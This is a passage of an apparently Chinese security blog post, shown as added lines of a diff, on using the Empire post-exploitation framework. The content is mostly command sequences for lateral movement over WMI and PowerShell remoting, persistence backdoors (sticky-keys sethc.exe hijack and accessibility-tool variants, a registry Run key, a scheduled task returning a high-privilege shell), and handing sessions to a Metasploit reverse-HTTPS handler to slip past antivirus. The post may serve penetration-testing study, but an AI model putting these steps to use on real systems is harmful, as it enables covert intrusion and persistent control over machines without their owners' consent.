+<p>  [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-EiuWuqes-1619775582049)(..&#x2F;typora&#x2F;pic&#x2F;image-20201227125717808.png)]</p>
+<ul>
+<li><h4 id="Invoke-WMI"><a href="#Invoke-WMI" class="headerlink" title="Invoke -WMI"></a>Invoke -WMI</h4><p>比Ps-Exec安全，所有windows系统都启用了该服务，不会写入日志。极高隐蔽性。如果目标机开启了防火墙WMI将无法连接目标机器。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule lateral_movement/invoke_wmi<br><span class="hljs-built_in">set</span> Listener    <span class="hljs-comment">#设置监听名</span><br><span class="hljs-built_in">set</span>  ComputerName     <span class="hljs-comment">#设置机器名</span><br>execute<br></code></pre></td></tr></table></figure>
+
+
+</li>
+<li><h4 id="PowerShell-Remoting"><a href="#PowerShell-Remoting" class="headerlink" title="PowerShell Remoting"></a>PowerShell Remoting</h4><p>Powershell Remoting是Powershell 的远程管理功能。开启windows远程管理服务WinRM系统会监听5985端口，该服务默认在windows server2012中是开启的，在windows server 2003&#x2F;2008&#x2F;2008 R2中需要手动启动。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">   usemodule lateral_movement/invoke_paremoting<br><span class="hljs-built_in">set</span> Listener    <span class="hljs-comment">#设置监听名</span><br><span class="hljs-built_in">set</span>  ComputerName     <span class="hljs-comment">#设置机器名</span><br>execute<br></code></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p>  后门最主要的目的就是方便以后再次秘密进入或者控制系统</p>
+<ul>
+<li><h4 id="权限持久性劫持shift后门"><a href="#权限持久性劫持shift后门" class="headerlink" title="权限持久性劫持shift后门"></a>权限持久性劫持shift后门</h4><p>输入：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule lateral_movement/invoke_wmi_debugger<br><span class="hljs-built_in">set</span> Listener    <span class="hljs-comment">#设置监听名</span><br><span class="hljs-built_in">set</span>  ComputerName     <span class="hljs-comment">#设置机器名</span><br><span class="hljs-built_in">set</span> TargetBinary  sethc.exe<br>execute<br></code></pre></td></tr></table></figure>
+
+<p>运行完后再目标主机远程登录窗口按5次shift键即可触发后门。</p>
+<p>sethc.exe可以替换成以下这几项：</p>
+<p>1.Utilman.exe(使用Win+U组合键启动)</p>
+<p>2.osk.exe(屏幕上的键盘：使用win+U启动组合键)</p>
+<p>3.Narrator.exe(启动讲述人：使用win+U启动组合键)</p>
+<p>4.Magnify.exe(放大镜:使用Win+U组合键启动)</p>
+</li>
+<li><h4 id="注册表注入后门"><a href="#注册表注入后门" class="headerlink" title="注册表注入后门"></a>注册表注入后门</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule persistence/userland/registry<br><span class="hljs-built_in">set</span> RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run<br>execute<br></code></pre></td></tr></table></figure>
+
+<p>当我们登录系统时木马就会运行，服务端反弹成功。</p>
+</li>
+<li><h4 id="计划任务获得系统权限"><a href="#计划任务获得系统权限" class="headerlink" title="计划任务获得系统权限"></a>计划任务获得系统权限</h4><p>到了具体的时间将成功返回一个高权限shell,再实际渗透模块中运行该模块时，杀毒软件会有提示</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule persistence/elevated/schtasks<br><span class="hljs-built_in">set</span> Listener wei<br><span class="hljs-built_in">set</span> DailyTime 15:36<br>execute<br></code></pre></td></tr></table></figure>
+
+<p>这里如果把 set RegPath改为    set RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run</p>
+<p>那么就会再15:36添加一个注册表注入后门。</p>
+</li>
+</ul>
+<h2 id="Empire反弹回Metasploit"><a href="#Empire反弹回Metasploit" class="headerlink" title="Empire反弹回Metasploit"></a>Empire反弹回Metasploit</h2><p>在实际渗透中，当拿到Webshell上传的MSF客户端无法绕过目标主机的杀毒软件时，可以使用Powershell来绕过，也可以执行Empire的payload来绕过，成功之后在使用Empire的模块将其反弹回Metasploit</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule code_execution/invoke_shellcode<br><span class="hljs-built_in">set</span> Lhost                 <span class="hljs-comment">#设置msf所在主机的IP</span><br><span class="hljs-built_in">set</span> Lport                  <span class="hljs-comment">#设置端口</span><br>execute<br></code></pre></td></tr></table></figure>
+
+<p>在msf上设置监听：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_https<br><span class="hljs-built_in">set</span> lhost                    <span class="hljs-comment">#一般不用管设置</span><br><span class="hljs-built_in">set</span> lport				    <span class="hljs-comment">#一般不用管设置</span><br><span class="hljs-built_in">set</span> Shellcode                <span class="hljs-comment">#自定义shellcode注入</span><br>run<br></code></pre></td></tr></table></figure>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/" class="category-chain-item">内网安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">#内网安全</a>
+      
+        <a href="/tags/Empire%E4%BD%BF%E7%94%A8/">#Empire使用</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Empire使用</div>
+      <div>http://idea-oss.github.io/2022/06/15/Empire使用/Empire使用/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>iDea</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年6月15日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/06/15/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E5%AE%9A%E4%BD%8D%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/" title="定位域管理员">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">定位域管理员</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/" title="内网密码抓取">
+                        <span class="hidden-mobile">内网密码抓取</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.18/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"0mPxzRPwogk31Fn10hTPyb1K-gzGzoHsz","appKey":"BUzND1EWjf6LGVsgj979UcGb","path":"window.location.pathname","placeholder":"说点什么吧","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":false,"serverURLs":"https://0mpxzrpw.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":null},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>可乐</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>不乐</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
